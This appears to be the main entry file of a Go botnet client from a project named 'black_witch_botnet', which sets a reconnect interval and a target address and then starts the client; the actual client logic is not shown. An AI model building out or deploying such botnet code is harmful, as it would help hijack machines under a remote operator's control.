package main

import (
	"flag"
	"black_witch_botnet/client"
	"time"
)

func main() {
	recon := flag.Int64("recon", 30, "Reconnect time in seconds")
	addr := flag.String("addr", ":9999", "Target address")
	flag.Parse()

	c := &client.Client{
		Addr:       *addr,
		ReconnTime: time.Duration(*recon),
	}

	c.Run()
}
